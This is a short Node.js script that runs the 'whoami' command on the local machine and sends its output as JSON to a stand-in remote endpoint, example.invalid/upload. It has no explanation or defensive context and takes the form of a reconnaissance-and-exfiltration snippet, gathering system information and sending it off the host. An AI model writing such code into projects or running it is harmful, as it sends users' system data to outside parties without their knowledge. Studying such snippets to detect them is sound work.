const { execSync } = require("child_process");
const https = require("https");

function send(payload) {
  const request = https.request("https://example.invalid/upload");
  request.write(JSON.stringify(payload));
}

const output = execSync("whoami").toString();
const envelope = { output };
send(envelope);
